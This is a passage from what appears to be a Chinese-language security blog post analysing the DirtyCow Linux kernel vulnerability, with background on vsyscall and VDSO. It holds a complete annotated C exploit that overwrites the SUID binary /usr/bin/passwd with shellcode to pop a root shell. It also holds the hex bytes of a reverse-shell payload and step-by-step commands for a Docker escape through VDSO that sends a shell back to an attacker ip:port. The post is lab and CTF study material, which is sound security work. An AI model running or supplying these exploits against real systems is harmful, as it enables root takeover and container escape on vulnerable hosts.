0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,</span></span><br><span class="line"><span class="comment">  0x00, 0x80, 0x04, 0x08, 0x00, 0x80, 0x04, 0x08, 0x88, 0x00, 0x00, 0x00,</span></span><br><span class="line"><span class="comment">  0xbc, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,</span></span><br><span class="line"><span class="comment">  0x31, 0xdb, 0x6a, 0x17, 0x58, 0xcd, 0x80, 0x6a, 0x0b, 0x58, 0x99, 0x52,</span></span><br><span class="line"><span class="comment">  0x66, 0x68, 0x2d, 0x63, 0x89, 0xe7, 0x68, 0x2f, 0x73, 0x68, 0x00, 0x68,</span></span><br><span class="line"><span class="comment">  0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0x52, 0xe8, 0x0a, 0x00, 0x00, 0x00,</span></span><br><span class="line"><span class="comment">  0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73, 0x68, 0x00, 0x57, 0x53,</span></span><br><span class="line"><span class="comment">  0x89, 0xe1, 0xcd, 0x80</span></span><br><span class="line"><span class="comment">&#125;;</span></span><br><span class="line"><span class="comment">unsigned int sc_len = 136;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">madviseThread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *str;</span><br><span class="line">    str=(<span class="keyword">char</span>*)arg;</span><br><span class="line">    <span class="keyword">int</span> i,c=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">1000000</span> &amp;&amp; !stop;i++) &#123;</span><br><span class="line">        c+=madvise(<span class="built_in">map</span>,<span class="number">100</span>,MADV_DONTNEED);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;thread stopped\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">procselfmemThread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *str;</span><br><span class="line">    str=(<span class="keyword">char</span>*)arg;</span><br><span class="line">    <span class="keyword">int</span> f=open(<span class="string">&quot;/proc/self/mem&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">int</span> i,c=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">1000000</span> &amp;&amp; !stop;i++) &#123;</span><br><span class="line">        lseek(f,<span class="built_in">map</span>,SEEK_SET);</span><br><span class="line">        c+=write(f, str, sc_len);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;thread stopped\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">waitForWrite</span><span class="params">(<span class="keyword">void</span> *arg)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[sc_len];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(;;) &#123;</span><br><span class="line">        FILE *fp = fopen(suid_binary, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line"></span><br><span class="line">        fread(buf, sc_len, <span class="number">1</span>, fp);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, sc, sc_len) == <span class="number">0</span>) &#123;			<span class="comment">// 比较当前读出的/usr/bin/passwd文件内容是否被改成了shellcode，如果是，就退出for循环</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s overwritten\n&quot;</span>, suid_binary);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        fclose(fp);</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    stop = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Popping root shell.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Don&#x27;t forget to restore /tmp/bak\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    system(suid_binary);			<span class="comment">// 执行被更改的SUID程序，即可获得root shell</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *backup;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;DirtyCow root privilege escalation\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Backing up %s to /tmp/bak\n&quot;</span>, suid_binary);</span><br><span class="line"></span><br><span class="line">    asprintf(&amp;backup, <span class="string">&quot;cp %s /tmp/bak&quot;</span>, suid_binary);</span><br><span class="line">    system(backup);				<span class="comment">// 将原始的/usr/bin/passwd做一个备份，方便后续恢复</span></span><br><span class="line"></span><br><span class="line">    f = open(suid_binary,O_RDONLY);		<span class="comment">// 打开目标二进制程序文件/usr/bin/passwd</span></span><br><span class="line">    fstat(f,&amp;st);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Size of binary: %d\n&quot;</span>, st.st_size);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> payload[st.st_size];</span><br><span class="line">    <span class="built_in">memset</span>(payload, <span class="number">0x90</span>, st.st_size);		<span class="comment">// 根据程序文件大小来设置payload的大小，用0x90(nop)进行填充</span></span><br><span class="line">    <span class="built_in">memcpy</span>(payload, sc, sc_len+<span class="number">1</span>);			<span class="comment">// 将shellcode拷贝到payload中</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">map</span> = mmap(<span class="literal">NULL</span>,st.st_size,PROT_READ,MAP_PRIVATE,f,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Racing, this may take a while..\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    pthread_create(&amp;pth1, <span class="literal">NULL</span>, &amp;madviseThread, suid_binary);	     <span class="comment">// 此线程为了触发漏洞</span></span><br><span class="line">    pthread_create(&amp;pth2, <span class="literal">NULL</span>, &amp;procselfmemThread, payload);		<span class="comment">// 此线程负责用payload覆盖/usr/bin/passwd</span></span><br><span class="line">    pthread_create(&amp;pth3, <span class="literal">NULL</span>, &amp;waitForWrite, <span class="literal">NULL</span>);			<span class="comment">// 此线程等待/usr/bin/passwd被写成功后，获取root shell</span></span><br><span class="line"></span><br><span class="line">    pthread_join(pth3, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+
+
+
+        <h2 id="exp验证-1"   >
+          <a href="#exp验证-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#exp验证-1" class="headerlink" title="exp验证"></a>exp验证</h2>
+      <p>环境准备：下载老版本 <span class="exturl"><a class="exturl__link"   href="https://link.juejin.cn/?target=http://old-releases.ubuntu.com/releases/14.04.0/ubuntu-14.04.5-server-amd64.iso" >ubuntu-server 14.04.5</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 镜像并安装到虚拟机</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc dirty.c -lpthread -o dirty</span><br><span class="line">.&#x2F;dirty</span><br></pre></td></tr></table></div></figure>
+<p>执行完成后，立刻拿到root shell。</p>
+<p><img   src="image-20230502021331361.png?size=600" style="width: 600px;"  alt="image-20230502021331361"></p>
+
+        <h1 id="利用VDSO完成docker逃逸"   >
+          <a href="#利用VDSO完成docker逃逸" class="heading-link"><i class="fas fa-link"></i></a><a href="#利用VDSO完成docker逃逸" class="headerlink" title="利用VDSO完成docker逃逸"></a>利用VDSO完成docker逃逸</h1>
+      <p>如何将dirtycow应用在docker逃逸中呢？scumjr给出了一个基于VDSO的逃逸方案。</p>
+<p>VDSO是内核的一个共享库，它被映射给了用户态使用，用户空间中它的权限是rx。而docker使用的就是宿主机host的内核，也就是说VDSO是连通docker和host的一个公共组件，如果这个组件代码段被docker利用漏洞更改，那么就会影响到宿主机host，进而达到docker逃逸的目的。</p>
+
+        <h2 id="exp分析-2"   >
+          <a href="#exp分析-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#exp分析-2" class="headerlink" title="exp分析"></a>exp分析</h2>
+      <blockquote>
+<p>参考文章：</p>
+<ul>
+<li><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/enjoy5512/article/details/53196047" >脏牛漏洞-Docker逃逸POC(dirtycow-vdso)代码分析</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li>
+</ul>
+</blockquote>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/scumjr/dirtycow-vdso" >scumjr的exp</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 通过ptrace子进程的方式产生COW，修改vdso中代码段位置（<code>clock_gettime()</code>函数）完成提权。利用代码分为两个部分：</p>
+<ol>
+<li><p>利用代码逻辑：<a href="0xdeadbeef.c">0xdeadbeef.c - 带注释</a></p>
+<ul>
+<li><p>主要操作：</p>
+<ul>
+<li><p>解析传入的ip:port</p>
+</li>
+<li><p>准备payload</p>
+</li>
+<li><p>vdso中有两处需要patch（如下图红色部分），准备vdso_patch</p>
+<p><img src="../../../2023/0418-dirtycow/rwctf-Be-a-Docker-Escaper-3/Be-a-Docker-Escaper-3.assets/image-20230428190409281.png" alt="image-20230428190409281"></p>
+</li>
+<li><p>dirtycow + ptrace完成对VDSO的写入</p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>payload汇编：payload.s</p>
+<ul>
+<li>功能：判断请求来自docker还是host，如果来自host（且是root进程调用的，且无/tmp/.x文件，表示从未执行过反弹shell的代码）则反弹shell到目标<code>ip:port</code></li>
+<li>使用：<code>nasm -f bin -o payload payload.s</code> , <code>xxd -i payload payload.h</code></li>
+<li>生成的payload.h如下：</li>
+</ul>
+</li>
+</ol>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> payload[] = &#123;</span><br><span class="line">  <span class="number">0x57</span>, <span class="number">0x56</span>, <span class="number">0x52</span>, <span class="number">0x51</span>, <span class="number">0xb8</span>, <span class="number">0x66</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0f</span>, <span class="number">0x05</span>, <span class="number">0x48</span>,</span><br><span class="line">  <span class="number">0x85</span>, <span class="number">0xc0</span>, <span class="number">0x0f</span>, <span class="number">0x85</span>, <span class="number">0xbb</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xe8</span>, <span class="number">0xc9</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8d</span>, <span class="number">0x74</span>, <span class="number">0x24</span>, <span class="number">0xf0</span>, <span class="number">0xba</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xb8</span>,</span><br><span class="line">  <span class="number">0x59</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0f</span>, <span class="number">0x05</span>, <span class="number">0x48</span>, <span class="number">0x39</span>, <span class="number">0xd0</span>, <span class="number">0x0f</span>, <span class="number">0x85</span>, <span class="number">0x9c</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xc7</span>, <span class="number">0x0f</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xd1</span>, <span class="number">0xf3</span>, <span class="number">0xa6</span>,</span><br><span class="line">  <span class="number">0x0f</span>, <span class="number">0x85</span>, <span class="number">0x8d</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0xbe</span>, <span class="number">0x2f</span>, <span class="number">0x74</span>, <span class="number">0x6d</span>, <span class="number">0x70</span>,</span><br><span class="line">  <span class="number">0x2f</span>, <span class="number">0x2e</span>, <span class="number">0x78</span>, <span class="number">0x00</span>, <span class="number">0x56</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe7</span>, <span class="number">0xbe</span>, <span class="number">0xc0</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xb8</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0f</span>, <span class="number">0x05</span>, <span class="number">0x48</span>, <span class="number">0x85</span>, <span class="number">0xc0</span>, <span class="number">0x5e</span>,</span><br><span class="line">  <span class="number">0x78</span>, <span class="number">0x6d</span>, <span class="number">0xb8</span>, <span class="number">0x39</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0f</span>, <span class="number">0x05</span>, <span class="number">0x48</span>, <span class="number">0x85</span>, <span class="number">0xc0</span>,</span><br><span class="line">  <span class="number">0x75</span>, <span class="number">0x61</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xf6</span>, <span class="number">0xf7</span>, <span class="number">0xe6</span>, <span class="number">0x48</span>, <span class="number">0xff</span>, <span class="number">0xc6</span>, <span class="number">0x6a</span>, <span class="number">0x02</span>,</span><br><span class="line">  <span class="number">0x5f</span>, <span class="number">0x04</span>, <span class="number">0x29</span>, <span class="number">0x0f</span>, <span class="number">0x05</span>, <span class="number">0x50</span>, <span class="number">0x5f</span>, <span class="number">0x52</span>, <span class="number">0x52</span>, <span class="number">0xc7</span>, <span class="number">0x44</span>, <span class="number">0x24</span>,</span><br><span class="line">  <span class="number">0x04</span>, <span class="number">0xde</span>, <span class="number">0xc0</span>, <span class="number">0xad</span>, <span class="number">0xde</span>, <span class="number">0x66</span>, <span class="number">0xc7</span>, <span class="number">0x44</span>, <span class="number">0x24</span>, <span class="number">0x02</span>, <span class="number">0x37</span>, <span class="number">0x13</span>,</span><br><span class="line">  <span class="number">0xc6</span>, <span class="number">0x04</span>, <span class="number">0x24</span>, <span class="number">0x02</span>, <span class="number">0x54</span>, <span class="number">0x5e</span>, <span class="number">0x6a</span>, <span class="number">0x10</span>, <span class="number">0x5a</span>, <span class="number">0x6a</span>, <span class="number">0x2a</span>, <span class="number">0x58</span>,</span><br><span class="line">  <span class="number">0x0f</span>, <span class="number">0x05</span>, <span class="number">0x48</span>, <span class="number">0x85</span>, <span class="number">0xc0</span>, <span class="number">0x78</span>, <span class="number">0x25</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x6a</span>, <span class="number">0x03</span>,</span><br><span class="line">  <span class="number">0x5e</span>, <span class="number">0xff</span>, <span class="number">0xce</span>, <span class="number">0xb0</span>, <span class="number">0x21</span>, <span class="number">0x0f</span>, <span class="number">0x05</span>, <span class="number">0x75</span>, <span class="number">0xf8</span>, <span class="number">0x56</span>, <span class="number">0x5a</span>, <span class="number">0x56</span>,</span><br><span class="line">  <span class="number">0x48</span>, <span class="number">0xbf</span>, <span class="number">0x2f</span>, <span class="number">0x2f</span>, <span class="number">0x62</span>, <span class="number">0x69</span>, <span class="number">0x6e</span>, <span class="number">0x2f</span>, <span class="number">0x73</span>, <span class="number">0x68</span>, <span class="number">0x57</span>, <span class="number">0x54</span>,</span><br><span class="line">  <span class="number">0x5f</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0xb0</span>, <span class="number">0x3b</span>, <span class="number">0x0f</span>, <span class="number">0x05</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0xb0</span>,</span><br><span class="line">  <span class="number">0x3c</span>, <span class="number">0x0f</span>, <span class="number">0x05</span>, <span class="number">0x59</span>, <span class="number">0x5a</span>, <span class="number">0x5e</span>, <span class="number">0x5f</span>, <span class="number">0x58</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">  <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0xff</span>, <span class="number">0xe0</span>, <span class="number">0x48</span>, <span class="number">0x8d</span>,</span><br><span class="line">  <span class="number">0x3d</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xc3</span>, <span class="number">0x2f</span>, <span class="number">0x70</span>, <span class="number">0x72</span>, <span class="number">0x6f</span>, <span class="number">0x63</span>, <span class="number">0x2f</span>,</span><br><span class="line">  <span class="number">0x31</span>, <span class="number">0x2f</span>, <span class="number">0x6e</span>, <span class="number">0x73</span>, <span class="number">0x2f</span>, <span class="number">0x70</span>, <span class="number">0x69</span>, <span class="number">0x64</span>, <span class="number">0x00</span>, <span class="number">0x70</span>, <span class="number">0x69</span>, <span class="number">0x64</span>,</span><br><span class="line">  <span class="number">0x3a</span>, <span class="number">0x5b</span>, <span class="number">0x34</span>, <span class="number">0x30</span>, <span class="number">0x32</span>, <span class="number">0x36</span>, <span class="number">0x35</span>, <span class="number">0x33</span>, <span class="number">0x31</span>, <span class="number">0x38</span>, <span class="number">0x33</span>, <span class="number">0x36</span>,</span><br><span class="line">  <span class="number">0x5d</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> payload_len = <span class="number">265</span>;</span><br></pre></td></tr></table></div></figure>
+
+
+
+        <h2 id="exp验证-2"   >
+          <a href="#exp验证-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#exp验证-2" class="headerlink" title="exp验证"></a>exp验证</h2>
+      <blockquote>
+<p>ubuntu14.04.3-desktop中验证失败（prologue的问题，改一下可以成），ubuntu14.04.5-server中验证成功</p>
+</blockquote>
+<blockquote>
+<p>参考文章：</p>
+<ul>
+<li><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://juejin.cn/post/6950955315751813134" >Docker逃逸–脏牛漏洞POC测试</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li>
+</ul>
+</blockquote>
+<p>搭建实验环境及exp验证步骤如下：</p>
+<ol>
+<li><p>下载老版本 <span class="exturl"><a class="exturl__link"   href="https://link.juejin.cn/?target=http://old-releases.ubuntu.com/releases/14.04.0/ubuntu-14.04.5-server-amd64.iso" >ubuntu-server 14.04.5</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 镜像并安装：</p>
+</li>
+<li><p>安装好docker及docker-compose</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install libltdl7 libsystemd-journal0</span><br><span class="line">$ wget https://download.docker.com/linux/ubuntu/dists/trusty/pool/stable/amd64/docker-ce_17.03.0~ce-0~ubuntu-trusty_amd64.deb</span><br><span class="line">$ sudo dpkg -i docker-ce_17.03.0_ce-0_ubuntu-trusty_amd64.deb</span><br><span class="line">$ sudo curl -L https://github.com/docker/compose/releases/download/1.21.0/docker-compose-$(uname -s)-$(uname -m) -o /usr/<span class="built_in">local</span>/bin/docker-compose</span><br><span class="line">$ sudo chmod +x /usr/<span class="built_in">local</span>/bin/docker-compose</span><br></pre></td></tr></table></div></figure></li>
+<li><p>设置容器环境</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/gebl/dirtycow-docker-vdso.git</span><br><span class="line">$ <span class="built_in">cd</span> dirtycow-docker-vdso/</span><br><span class="line">$ sudo docker-compose run dirtycow /bin/bash</span><br></pre></td></tr></table></div></figure></li>
+<li><p>进入容器，编译poc并执行</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> /dirtycow-vdso/</span><br><span class="line">$ make</span><br><span class="line">$ ./0xdeadbeef 192.168.133.128:1234</span><br></pre></td></tr></table></div></figure></li>
+<li><p>查看是否成功接收到反弹shell</p>
+<p><img   src="image-20230428151541933.png?size=600" style="width: 600px;"  alt="image-20230428151541933"></p>
+</li>
+</ol>
+
+        <h2 id="拓展"   >
+          <a href="#拓展" class="heading-link"><i class="fas fa-link"></i></a><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h2>
+      <p>RWCTF 2023中有一道题是关于dirtycow的，叫做”Be a Docker Escaper 3”。<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/PHdDA0iQXm7e8aByHdxcQA" >官方给出的WP</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>中指出，这个题目跟上文scumjr的利用有两点差异：</p>
+<ol>
+<li>最新版docker中禁用了ptrace。所以得考虑通过<code>/proc/self/mem</code>产生COW完成利用，那么就有许多代码逻辑要改</li>
+<li>题目环境中vdso的构造跟scumjr不一样。所以需要人工定位一下<code>clock_gettime()</code>地址，可以写死在代码逻辑中</li>
+</ol>
+<p>出题人给了它的exp：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/zh-explorer/dirtycow" >exploit for dirtycow</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+
+        <h1 id="知识点"   >
+          <a href="#知识点" class="heading-link"><i class="fas fa-link"></i></a><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1>
+      
+        <h2 id="什么是vdso"   >
+          <a href="#什么是vdso" class="heading-link"><i class="fas fa-link"></i></a><a href="#什么是vdso" class="headerlink" title="什么是vdso"></a>什么是vdso</h2>
+      <blockquote>
+<p> 参考文章：</p>
+<ul>
+<li><p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/436454953" >Linux vDSO概述</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+</li>
+<li><p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1073909" >人见人爱的vDSO机制，如今也靠不住了</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+</li>
+</ul>
+</blockquote>
+
+        <h3 id="先有vsyscall"   >
+          <a href="#先有vsyscall" class="heading-link"><i class="fas fa-link"></i></a><a href="#先有vsyscall" class="headerlink" title="先有vsyscall"></a>先有vsyscall</h3>
+      <p>vsyscall区域位于内核地址空间，它是唯一允许用户访问的区域。该区域地址固定为0xffffffffff600000，大小固定为4K。所有进程都共享内核映射。但是它有两个缺点，导致开发人员抛弃了vsyscall机制：</p>
+<ol>
+<li>vsyscall映射地址固定不变，使攻击者很容易利用它当跳板（在x86_64上通过emulated vsyscall机制，借助vvar mapping可一定程度上缓解该问题，但性能不如vsyscall native）</li>
+<li>vsyscall支持的系统调用数量有限，无法方便地扩展</li>
+</ol>
+<p>vsyscall中支持的三个系统调用：</p>
+<ul>
+<li>gettimeofday()</li>
+<li>time()</li>
+<li>getcpu()</li>
+</ul>
+<p><img   src="image-20230426180135721.png?size=600" style="width: 600px;"  alt="image-20230426180135721"></p>
+
+        <h3 id="再有vdso"   >
+          <a href="#再有vdso" class="heading-link"><i class="fas fa-link"></i></a><a href="#再有vdso" class="headerlink" title="再有vdso"></a>再有vdso</h3>
+      <p>鉴于vsyscall的缺点，开发人员设计了VDSO机制来取代vsyscall。</p>
+<p>VDSO的定义：</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">The &quot;vDSO&quot; (virtual dynamic shared object) is a small shared library</span><br><span class="line">that the kernel automatically maps into the address space of all user-space applications.  Applications usually do not need to concern themselves with these details as the vDSO is most commonly called by the C library.  This way you can code in the normal way using standard functions and the C library will take care of using any functionality that is available via the vDSO.</span><br><span class="line">（VDSO是内核的一个共享库（代码段），它被映射给了用户态使用）</span><br></pre></td></tr></table></div></figure>
+<p>VDSO与vsyscall的区别：</p>
+<ol>
+<li>VDSO本质上是一个ELF共享目标文件，而vsyscall只是一段内存代码和数据</li>
+<li>vsyscall位于内核地址空间，采用静态地址映射方式；而VDSO借助共享目标文件天生具有PIC特性，可以以进程为粒度动态映射到进程地址空间中。</li>
+</ol>
+<p>为了兼容老旧程序，vsyscall机制（native模式和emulation模式）仍旧被保留下来。所以<code>cat /proc/self/maps</code>时可以同时看到vvar，vdso，vsyscall三种特殊的mapping。</p>
+
+        <h3 id="导出vdso"   >
+          <a href="#导出vdso" class="heading-link"><i class="fas fa-link"></i></a><a href="#导出vdso" class="headerlink" title="导出vdso"></a>导出vdso</h3>
+      <p>为了更直观地看到VDSO，我们有两种方法将其导出：</p>
+<ol>
+<li><p>在gdb中导出vdso</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dumpmem vdso.so 0x00007ffff7ffa000 0x00007ffff7ffc000</span><br></pre></td></tr></table></div></figure></li>
+<li><p>写个c程序导出vdso</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/auxv.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">get_vdso_addr</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> getauxval(AT_SYSINFO_EHDR);			<span class="comment">// 获取VDSO的地址</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> vdso_addr;</span><br><span class="line">	<span class="keyword">int</span> fd;</span><br><span class="line"></span><br><span class="line">	vdso_addr = get_vdso_addr();</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[*] vdso addr: %016lx\n&quot;</span>, vdso_addr);</span><br><span class="line"></span><br><span class="line">	fd = open(argv[<span class="number">1</span>], O_CREAT|O_TRUNC|O_WRONLY, <span class="number">0644</span>);</span><br><span class="line">	<span class="keyword">if</span> (fd == <span 